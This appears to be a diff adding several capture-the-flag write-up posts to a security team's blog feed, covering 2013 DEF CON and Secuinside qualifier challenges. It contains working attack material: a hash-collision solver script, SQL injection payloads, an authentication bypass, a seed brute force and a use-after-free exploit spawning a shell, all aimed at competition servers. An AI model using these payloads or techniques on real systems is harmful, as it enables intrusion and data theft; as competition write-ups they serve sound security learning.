+    0x04, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00,
+    0x10, 0x00, 0x00, 0x00, 0x17, 0x00, 0x00, 0x00,
+    0x04, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00,
+    0x10, 0x00, 0x00, 0x00, 0x17, 0x00, 0x00, 0x00,
+    0x04, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00,
+    0x10, 0x00, 0x00, 0x00, 0x17, 0x00, 0x00, 0x00,
+    0x06, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00,
+    0x0f, 0x00, 0x00, 0x00, 0x15, 0x00, 0x00, 0x00,
+    0x06, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00,
+    0x0f, 0x00, 0x00, 0x00, 0x15, 0x00, 0x00, 0x00,
+    0x06, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00,
+    0x0f, 0x00, 0x00, 0x00, 0x15, 0x00, 0x00, 0x00,
+    0x06, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00,
+    0x0f, 0x00, 0x00, 0x00, 0x15, 0x00, 0x00, 0x00};
+
+void calc_hash(unsigned char* input, unsigned int size, unsigned char* output)
+{
+    unsigned int* BOX = (unsigned int*)BOX_;
+    unsigned char *buffer_ptr = NULL;
+
+    unsigned char IV[] = {0x68, 0x69, 0x20, 0x6D, 0x79, 0x20, 0x6E, 0x61, 0x6D, 0x65, 0x20, 0x69, 0x73, 0x20, 0x69, 0x74};
+
+    unsigned int counter_1 = 0;
+    unsigned int ctr = 0;
+
+    ctr = size + 1;
+    while((ctr &amp; 0x3f) != 0x38)
+    {
+        ++ctr;
+    }
+    buffer_ptr = (unsigned char*)malloc(ctr + 8);
+    memcpy(buffer_ptr, input, size);
+    *(buffer_ptr + size) = 0x80;
+    unsigned int input_size_2 = size + 1;
+
+    unsigned int buffer_A[2000] = {0};
+
+    unsigned int string_1, string_2, string_3, string_4, string_5, ctr_3, string_6;
+
+    while(ctr &gt; input_size_2)
+    {
+        *(buffer_ptr + input_size_2) = 0;
+        ++input_size_2;
+    }
+
+    unsigned int a_ = size &lt;&lt; 3;
+    unsigned char* b_ = buffer_ptr + ctr;
+    *b_ = (unsigned char)a_;
+    *(b_ + 1) = (unsigned char)(a_ &gt;&gt; 8);
+    *(b_ + 2) = (unsigned char)(a_ &gt;&gt; 16);
+    *(b_ + 3) = (unsigned char)(a_ &gt;&gt; 24);
+
+    unsigned int c_ = size &gt;&gt; 0x1d;
+    unsigned char* d_ = buffer_ptr + ctr + 4;
+    *d_ = (unsigned char)c_;
+    *(d_ + 1) = (unsigned char)(c_ &gt;&gt; 8);
+    *(d_ + 2) = (unsigned char)(c_ &gt;&gt; 16);
+    *(d_ + 3) = (unsigned char)(c_ &gt;&gt; 24);
+    input_size_2 = 0;
+
+    while(ctr &gt; input_size_2)
+    {
+        // 0x40248f
+        unsigned int ctr_2 = 0;
+        while(ctr_2 &lt;= 15)
+        {
+            // 0x402498
+            unsigned char* e_ = buffer_ptr + input_size_2 + (ctr_2 &lt;&lt; 2);
+            unsigned int c = *(e_);
+            unsigned int d = *(e_ + 1);
+            d = d &lt;&lt; 8;
+            d = d | c;
+            c = *(e_ + 2) &lt;&lt; 16;
+            d = d | c;
+            c = *(e_ + 3) &lt;&lt; 24;
+            c = c | d;
+            buffer_A[ctr_2] = c;
+            ++ctr_2;
+        }
+        string_1 = *(unsigned int*)IV;
+        string_2 = *(unsigned int*)(IV + 4);
+        string_3 = *(unsigned int*)(IV + 8);
+        string_4 = *(unsigned int*)(IV + 12);
+
+        ctr_2 = 0;
+        while(ctr_2 &lt;= 63)
+        {
+            // 0x402535
+            if(ctr_2 &lt;= 0xf)
+            {
+                string_5 = (~string_2 &amp; string_4) | (string_3 &amp; string_2);
+                ctr_3 = ctr_2;
+            }
+            // 0x402558
+            else if(ctr_2 &lt;= 0x1f)
+            {
+                string_5 = (~string_4 &amp; string_3) | (string_4 &amp; string_2);
+                ctr_3 = ((ctr_2 &lt;&lt; 2) + ctr_2 + 1) &amp; 0xf;
+            }
+            // 0x402588
+            else if(ctr_2 &lt;= 0x2f)
+            {
+                string_5 = (string_3 ^ string_2) ^ string_4;
+                ctr_3 = (ctr_2 * 3 + 5) &amp; 0xf;
+            }
+            else
+            {
+                // 0x4025b0
+                string_5 = (~string_4 | string_2) ^ string_3;
+                ctr_3 = ((ctr_2 &lt;&lt; 3) - ctr_2) &amp; 0xf;
+            }
+
+            // 0x4025ce
+            string_6 = string_4;
+            string_4 = string_3;
+            string_3 = string_2;
+            unsigned int ebx = string_1 + string_5;
+            double sin_result = sin((double)(ctr_2 + 1));
+            double d = sin_result * sin_result;
+            double e = sqrt(d) * 4.294967296e9;
+            unsigned long y = ebx + (unsigned long)e + buffer_A[ctr_3];
+            ebx = (y &lt;&lt; (BOX[ctr_2] &amp; 0xff));
+            d = sin((double)(ctr_2 + 1));
+            d = d * d;
+            e = sqrt(d) * 4.294967296e9;
+            unsigned int x1 = string_5 + string_1 + (unsigned long)e + buffer_A[ctr_3];
+            unsigned int x2 = 0x20 - BOX[ctr_2];
+            string_2 = string_2 + ((x1 &gt;&gt; (x2 &amp; 0xff)) | ebx);
+            string_1 = string_6;
+            ++ctr_2;
+        }
+        unsigned int x = *(unsigned int*)IV;
+        x += string_1;
+        *(unsigned int*)IV = x;
+        x = *(unsigned int*)(IV + 4);
+        x += string_2;
+        *(unsigned int*)(IV + 4) = x;
+        x = *(unsigned int*)(IV + 8);
+        x += string_3;
+        *(unsigned int*)(IV + 8) = x;
+        x = *(unsigned int*)(IV + 12);
+        x += string_4;
+        *(unsigned int*)(IV + 12) = x;
+        input_size_2 += 0x40;
+    }
+
+    free(buffer_ptr);
+    memcpy(output, IV, 16);
+    return;
+}
+</code></pre>
+
+<p>According to <a href="http://en.wikipedia.org/wiki/Md5#Pseudocode">Wikipedia</a>, it is a revised MD5. The IV is changed to &#8220;hi my name is it&#8221;. To find a collision, you may download and compile <a href="http://dl.packetstormsecurity.net/crypt/md/md5coll.c">md5coll</a> by Patrick Stach, and execute it with new IV.</p>
+
+<pre><code>fish@fish-Linux-Mint-13 ~/defconctf/tastycloud $ ./md5coll-optimized 0x6d206968 0x616e2079 0x6920656d 0x74692073
+block #1 done
+block #2 done
+unsigned int m0[32] = {
+0xf5ff5286, 0xd5187d3b, 0x30dd0e80, 0xca85cc02, 
+0x9747a14e, 0xc832351a, 0xcd333352, 0x16602937, 
+0x0632ecc1, 0x62b34dff, 0x83aee8f3, 0xd2c11b1d, 
+0x098950f8, 0x37dbacfa, 0x85abc37e, 0x1aac555a, 
+0x7ac11e49, 0x050463bb, 0xd3c58401, 0xd4d5dd63, 
+0xc6761a4f, 0x0dd022c4, 0x16696944, 0xe02da950, 
+0x747aeff5, 0x487cf5cc, 0xaae46a9a, 0x3e9ed485, 
+0xfd2968ee, 0x025bcaa4, 0x68f2289f, 0x4d353e49, 
+};
+
+unsigned int m1[32] = {
+0xf5ff5286, 0xd5187d3b, 0x30dd0e80, 0xca85cc02, 
+0x1747a14e, 0xc832351a, 0xcd333352, 0x16602937, 
+0x0632ecc1, 0x62b34dff, 0x83aee8f3, 0xd2c19b1d, 
+0x098950f8, 0x37dbacfa, 0x05abc37e, 0x1aac555a, 
+0x7ac11e49, 0x050463bb, 0xd3c58401, 0xd4d5dd63, 
+0x46761a4f, 0x0dd022c4, 0x16696944, 0xe02da950, 
+0x747aeff5, 0x487cf5cc, 0xaae46a9a, 0x3e9e5485, 
+0xfd2968ee, 0x025bcaa4, 0xe8f2289f, 0x4d353e49, 
+};
+</code></pre>
+
+<p>So here is the final Python script to get the key.</p>
+
+<pre><code>import sys, os, time, struct, socket
+
+HOST = "tastycloud.shallweplayaga.me"
+PORT = 6283
+
+data1 = "\x86\x52\xff\xf5\x3b\x7d\x18\xd5\x80\x0e\xdd\x30\x02\xcc\x85\xca\x4e\xa1\x47\x97\x1a\x35\x32\xc8\x52\x33\x33\xcd\x37\x29\x60\x16\xc1\xec\x32\x06\xff\x4d\xb3\x62\xf3\xe8\xae\x83\x1d\x1b\xc1\xd2\xf8\x50\x89\x09\xfa\xac\xdb\x37\x7e\xc3\xab\x85\x5a\x55\xac\x1a\x49\x1e\xc1\x7a\xbb\x63\x04\x05\x01\x84\xc5\xd3\x63\xdd\xd5\xd4\x4f\x1a\x76\xc6\xc4\x22\xd0\x0d\x44\x69\x69\x16\x50\xa9\x2d\xe0\xf5\xef\x7a\x74\xcc\xf5\x7c\x48\x9a\x6a\xe4\xaa\x85\xd4\x9e\x3e\xee\x68\x29\xfd\xa4\xca\x5b\x02\x9f\x28\xf2\x68\x49\x3e\x35\x4d"
+data2 = "\x86\x52\xff\xf5\x3b\x7d\x18\xd5\x80\x0e\xdd\x30\x02\xcc\x85\xca\x4e\xa1\x47\x17\x1a\x35\x32\xc8\x52\x33\x33\xcd\x37\x29\x60\x16\xc1\xec\x32\x06\xff\x4d\xb3\x62\xf3\xe8\xae\x83\x1d\x9b\xc1\xd2\xf8\x50\x89\x09\xfa\xac\xdb\x37\x7e\xc3\xab\x05\x5a\x55\xac\x1a\x49\x1e\xc1\x7a\xbb\x63\x04\x05\x01\x84\xc5\xd3\x63\xdd\xd5\xd4\x4f\x1a\x76\x46\xc4\x22\xd0\x0d\x44\x69\x69\x16\x50\xa9\x2d\xe0\xf5\xef\x7a\x74\xcc\xf5\x7c\x48\x9a\x6a\xe4\xaa\x85\x54\x9e\x3e\xee\x68\x29\xfd\xa4\xca\x5b\x02\x9f\x28\xf2\xe8\x49\x3e\x35\x4d"
+
+s = socket.socket()
+s.connect((HOST, PORT))
+size = len(data1) + len(data2)
+
+s.send(struct.pack("I",size))
+s.send(data1)
+s.send(data2)
+
+print s.recv(1024)
+</code></pre>
+
+<p>Run the script, we get the key: <strong>pringlelingus and redbull without a cause</strong></p>
+
+<p>This is one of the few challenges that we didn&#8217;t manage to solve during the game. It&#8217;s a pity as we finally noticed the final hashing algorithm is a revised MD5, however we have no time to construct a collision. It&#8217;s all my fault that I didn&#8217;t realized it was a MD5 as soon as possible <img src='http://www.blue-lotus.net/wp-includes/images/smilies/icon_razz.gif' alt=':P' class='wp-smiley' /> . Many thanks to NWMonster, Slipper and cq for their precious help.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[DEF CON CTF Qualifier 2013 3dub 5 Writeup]]></title>
+    <link href="http://www.blue-lotus.net/www/def-con-ctf-qualifier-2013-3dub-5-writeup/"/>
+    <updated>2013-06-17T00:00:00+08:00</updated>
+    <id>http://www.blue-lotus.net/www/def-con-ctf-qualifier-2013-3dub-5-writeup</id>
+    <content type="html"><![CDATA[<p>This task was solved by <em>aay</em> soon after the the problem came up.ym.</p>
+
+<p>The initial intention of the organizer is that the vulnerability is in session and the cookie is decrypt byte per byte so we can post some username like &#8216;admiX&#8217; and brute force the ciphertext of the last letter to get the admin&#8217;s session.However there&#8217;s another quick way to achieve the goal.</p>
+
+<p>As we visited the page, corresponding to the experience of solving the 3dub problem before, we tried to login as admin.But the ruby program had a runtime error.We thought that we should decode and construct the cookie.</p>
+
+<p>From the backtrace, we can get some code</p>
+
+<pre><code>get '/' do
+  haml :index
+end
+
+post '/' do
+  if params[:username] == 'admin'
+    raise "can't log in as admin, be smarter"
+end
+
+cipher = make_cipher
+cipher.encrypt
+cipher.key = CRYPTO_KEY
+iv = cipher.random_iv
+</code></pre>
+
+<p>That says the POST variable username is checked and cannot be admin.The key point is that we can use <strong>username[]</strong> to bypass since Array is a totally different thing from String.So just modify the form&#8217;s field from <em>username</em> to <em>username[]</em> and it takes effect.The problem is solved so far.</p>
+
+<p>However, the fact that really confuse me is that since username[] is an Array, why the program manages to run correctly by username[] which replaces username.</p>
+
+<p>I happened to find some clue later.Just changed the <em>username</em> field to <em>username[]</em> and added a new POST field <em>username[][]</em> and then submitted it.The program had another error: <strong>ArgumentError at / odd number of arguments for Hash</strong>, and the backtrace with some new code.</p>
+
+<pre><code>end
+
+cipher = make_cipher
+cipher.encrypt
+cipher.key = CRYPTO_KEY
+iv = cipher.random_iv
+
+plaintext = Hash[*params.sort.flatten].to_param
+
+ciphertext = cipher.update plaintext
+ciphertext &amp;lt;&amp;lt; cipher.final
+
+cookies[:iv] = iv
+cookies[:ciphertext] = ciphertext
+cookies[:verification] = params[:verification]
+</code></pre>
+
+<p>Now we can have a clear view on how the cookies are generated.And pay attention to the following code:</p>
+
+<pre><code>plaintext = Hash[*params.sort.flatten].to_param
+</code></pre>
+
+<p>The params list is sorted and then flattened which means that the inner square brackets [] are token out so that [&lsquo;admin&rsquo;] are changed into &#8216;admin&#8217;.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[DEF CON CTF Qualifier 2013 3dub 4 Writeup]]></title>
+    <link href="http://www.blue-lotus.net/www/def-con-ctf-qualifier-2013-3dub-4-writeup/"/>
+    <updated>2013-06-17T00:00:00+08:00</updated>
+    <id>http://www.blue-lotus.net/www/def-con-ctf-qualifier-2013-3dub-4-writeup</id>
+    <content type="html"><![CDATA[<p>The webpage is like this</p>
+
+<pre><code>Admin Files
+
+usernames.txt
+passwords.txt
+Login Here
+</code></pre>
+
+<p>You can view the usernames.txt</p>
+
+<p>and the URL is</p>
+
+<pre><code>http://rememberme.shallweplayaga.me/getfile.php?filename=usernames.txt&amp;amp;accesscode=60635c6862d44e8ac17dc5e144c66539
+</code></pre>
+
+<p>Guessing that the accesscode is one kind of hash of username.txt, after test, we can see</p>
+
+<pre><code>MD5 ("usernames.txt") = 60635c6862d44e8ac17dc5e144c66539
+</code></pre>
+
+<p>Then we can view other things in this site by building the valid URL</p>
+
+<p>By this way, we can see the getfile.php</p>
+
+<pre><code>Acces granted to getfile.php!
+
+$value = time();
+$filename = $_GET["filename"];
+$accesscode = $_GET["accesscode"];
+if (md5($filename) == $accesscode){
+echo "Acces granted to $filename!";
+
+srand($value);
+if (in_array($filename, array('getfile.php', 'index.html', 'key.txt', 'login.php', 'passwords.txt', 'usernames.txt'))==TRUE){
+$data = file_get_contents($filename);
+if ($data !== FALSE) {
+if ($filename == "key.txt") {
+$key = rand();
+$cyphertext = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, $data, MCRYPT_MODE_CBC);
+echo base64_encode($cyphertext);
+}
+else{
+echo nl2br($data);
+}
+
+}
+else{
+echo "File does not exist";
+}
+}
+else{
+echo "File does not exist";
+}
+
+}
+else{
+echo "Invalid access code";
+}
+?&amp;gt;
+</code></pre>
+
+<p>And there is a key.txt can view by this URL</p>
+
+<pre><code>http://rememberme.shallweplayaga.me/getfile.php?filename=key.txt&amp;amp;accesscode=65c2a527098e1f7747eec58e1925b453
+</code></pre>
+
+<p>the context is</p>
+
+<pre><code>Acces granted to key.txt!
+
+TEu4LOi+D8CU/+fjK6RUj3CnBuqjfTYA8IgWPNXFEV3R1bDvGLwDA3+1Ew9tdrFqbjonjRUebZBXFL6LdP69wQ==
+</code></pre>
+
+<p>the encrypt process can be seen in the getfile.php</p>
+
+<p>So the way to solve this porblem is refresh the</p>
+
+<pre><code>http://rememberme.shallweplayaga.me/getfile.php?filename=key.txt&amp;amp;accesscode=65c2a527098e1f7747eec58e1925b453
+</code></pre>
+
+<p>and write a native phpfile having</p>
+
+<pre><code>echo time();
+</code></pre>
+
+<p>so you will see a time, you should set it as a seed to generate the $key.</p>
+
+<p>At that time, I got the encrypt key is</p>
+
+<pre><code>TEu4LOi+D8CU/+fjK6RUj3CnBuqjfTYA8IgWPNXFEV3R1bDvGLwDA3+1Ew9tdrFqbjonjRUebZBXFL6LdP69wQ==
+</code></pre>
+
+<p>and the time is 1371387200</p>
+
+<p>We should search +-1000 around 1371387200.</p>
+
+<p>So I write this piece of code</p>
+
+<pre><code>$i = 1;
+while($i &amp;lt; 2000) 
+{
+    $value = 1371387200-1000+$i;
+    $data = &amp;quot;TEu4LOi+D8CU/+fjK6RUj3CnBuqjfTYA8IgWPNXFEV3R1bDvGLwDA3+1Ew9tdrFqbjonjRUebZBXFL6LdP69wQ==&amp;quot;;
+    $data = base64_decode($data);
+    srand($value);
+    $key = rand();
+    $plaintext = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $key, $data, MCRYPT_MODE_CBC);
+    echo $plaintext;
+    $i++;
+}
+</code></pre>
+
+<p>run it in your own computer and use Command + f or Ctrl + f to find</p>
+
+<pre><code>The key is
+</code></pre>
+
+<p>You will see the key~</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[DEF CON CTF Qualifier 2013 3dub 2 Writeup]]></title>
+    <link href="http://www.blue-lotus.net/www/def-con-ctf-qualifier-2013-3dub-2-writeup/"/>
+    <updated>2013-06-17T00:00:00+08:00</updated>
+    <id>http://www.blue-lotus.net/www/def-con-ctf-qualifier-2013-3dub-2-writeup</id>
+    <content type="html"><![CDATA[<p>This is just another appetizer.</p>
+
+<p>URL is</p>
+
+<pre><code>http://babysfirst.shallweplayaga.me:8041/
+</code></pre>
+
+<p>First I login use</p>
+
+<pre><code>username:    admin' or '1'='1
+password:    admin' or '1'='1
+</code></pre>
+
+<p>Then I got in it as root but see nothing, Seeing the header, there is the SQL query that made by me, It&#8217;s kindly like a SQLi problem.</p>
+
+<p>By this</p>
+
+<pre><code>a' UNION ALL SELECT sqlite_version() --
+</code></pre>
+
+<p>I see some number represent that the database behind the webpage is sqlite.</p>
+
+<p>Then it is easy</p>
+
+<pre><code>a' UNION ALL SELECT name from sqlite_master --
+</code></pre>
+
+<p>It returns</p>
+
+<pre><code>babysfirst
+
+success!
+
+logged in as keys
+</code></pre>
+
+<p>Then</p>
+
+<pre><code>a' UNION ALL SELECT * from keys --
+</code></pre>
+
+<p>You will get the key.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[DEF CON CTF Qualifier 2013 3dub 1 Writeup]]></title>
+    <link href="http://www.blue-lotus.net/www/def-con-ctf-qualifier-2013-3dub-1-writeup/"/>
+    <updated>2013-06-17T00:00:00+08:00</updated>
+    <id>http://www.blue-lotus.net/www/def-con-ctf-qualifier-2013-3dub-1-writeup</id>
+    <content type="html"><![CDATA[<p>This is just a appetizer.</p>
+
+<p>URL is</p>
+
+<pre><code>http://badmedicine.shallweplayaga.me:8042/
+</code></pre>
+
+<p>When you see the webpage, you see some login form and you can login as anyone but not admin.</p>
+
+<pre><code>badmedicine
+
+admin login disabled
+</code></pre>
+
+<p>The cat is in the cookie, you will see your username is in someway(some hash?) become the cookie, then I got the idea to change the cookie which represent admin.</p>
+
+<p>I use firefox and burpsuite to deal with this idea and then I got the key.</p>
+
+<p>It’s too easy and no law to see(lol, you should understand this piece of English via Chinese)</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[secuinside CTF 2013 quals movie_talk writeup]]></title>
+    <link href="http://www.blue-lotus.net/www/secuinside-ctf-2013-quals-movie_talk-writeup/"/>
+    <updated>2013-06-11T00:00:00+08:00</updated>
+    <id>http://www.blue-lotus.net/www/secuinside-ctf-2013-quals-movie_talk-writeup</id>
+    <content type="html"><![CDATA[<p>The program is a local console application that maintain information about movies. It provides add, delete, list operations for users. We noticed that there is a SIGQUIT(number 3) handler to free all allocated data structure of movies, but it failed to clean the pointers of movies, which leads to a use after free bug. Data structure of a movie is as below:</p>
+
+<pre><code>struct Movie
+{
+  void *handler;
+  char *name;
+  int id;
+  int rating;
+  int rate
+};
+</code></pre>
+
+<p>For each movie, the memories for the <code>Movie</code> struct and <code>Movie-&gt;name</code> are allocated on the heap. First, we can add a movie. Then, we add the second. However, at the moment before the program prompt to get movie name, we send SIGQUIT and get the first movie structure freed. Then the program get back to receive the second movie&#8217;s name. If we input a string with a appropriate length, the allocated chunk for the second movie&#8217;s name could be the same as the first movie&#8217;s struct, which has just been freed. Luckily, the pointer of the first movie still points to the original chunk. Thus, the first 4 bytes of the second movie&#8217;s name will become the first movie&#8217;s handler, which can be used controlled.</p>
+
+<p>We use an <code>add esp</code> gadget to migrate the stack to a very high position of the stack. Then we put a lot of common <code>ret2libc</code> combinations <code>system|system|"/bin/sh"|"/bin/sh"</code> in an environment variable, which is right in the higher part of the stack. If the <code>add esp</code> gadget migrate the stack top and hit the one of the <code>system</code> addresses in the environment variable, a shell will be spawned.</p>
+
+<p>Of course, we used the <code>ulimit -s unlimited</code> trick to disable ASLR of the shared library. We get the precise address of <code>system</code> and <code>"/binsh"</code> from the libc library. The environment variable defined by us is as below:</p>
+
+<pre><code>export EXPLOIT=$(python -c 'print "a"*9 + "\x80\xb2\x06\x40\x80\xb2\x06\x40\xf8\x2f\x19\x40\xf8\x2f\x19\x40" * 2000+"a"*15')
+</code></pre>
+
+<p>Python script for exploitation is as below:</p>
+
+<pre><code>import sys
+import os
+import subprocess
+import signal
+import time
+p = subprocess.Popen("./movie_talk", stdin=subprocess.PIPE)
+# add $0x228c,%esp
+addesp = "\xed\x15\x14\x40"
+# add first movie
+p.stdin.write("1\n1\n1\n0\n")
+time.sleep(3);
+# add second movie
+p.stdin.write("1\n")
+time.sleep(1)
+# free all movies
+p.send_signal(3)
+p.stdin.write(addesp + "AAAABBB\n1\n0\n")
+time.sleep(3)
+# use after free
+p.stdin.write("3\n")
+time.sleep(1)
+# execute shell command
+p.stdin.write("cat key.txt\n")
+time.sleep(1)
+</code></pre>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Secuinside 2013 save_the_zombie writeup]]></title>
+    <link href="http://www.blue-lotus.net/www/secuinside-2013-save_the_zombie-writeup/"/>
+    <updated>2013-06-09T00:00:00+08:00</updated>
+    <id>http://www.blue-lotus.net/www/secuinside-2013-save_the_zombie-writeup</id>
+    <content type="html"><![CDATA[<p>Two binaries are provided for this task, which are <em>Apache2</em> and <em>cli.exe</em>. <em>Apache2</em> is an ELF running under Linux, which is obviously packed, therefore static analysis seems impossible.</p>
+
+<p>Really? Let&#8217;s statically analyze the core-dump. Run <em>Apache2</em>, let gdb attach to the process, and execute <strong>generate-core-file</strong>. A core-dump of the target process is generated, which contains all unpacked instructions. Now it&#8217;s time for IDA <img src='http://www.blue-lotus.net/wp-includes/images/smilies/icon_biggrin.gif' alt=':D' class='wp-smiley' /> .</p>
+
+<p>A quick analysis told us that the <em>Apache2</em> is a daemon listening on a server, waiting for zombies to connect back and register themselves (with a special header field in HTTP request). Their IPs and ports are logged in a plain text file /t/a. Look at the other executable <em>cli.exe</em>, and we found it to be the actual backdoor program that runs on compromized zombies. It could accept commands from attackers to list any directories or echo the content of any files. Hence we should find the zombie and ask it to read the flag file for us. But&#8230; where is the zombie?</p>
+
+<p>It doesn&#8217;t take too much time before we found the <em>Apache2</em> is running on the specified server, and <a href="http://54.214.248.168/t/a">http://54.214.248.168/t/a</a> is the zombies-list. So let&#8217;s write a script, which is extremely easy, and make it connect to that machine, list all files in the current working directory, and read the key file out.</p>
+
+<p>We eventually got the key: <strong>Night Of The Living Dead</strong></p>
+]]></content>
+  </entry>
   
 </feed>
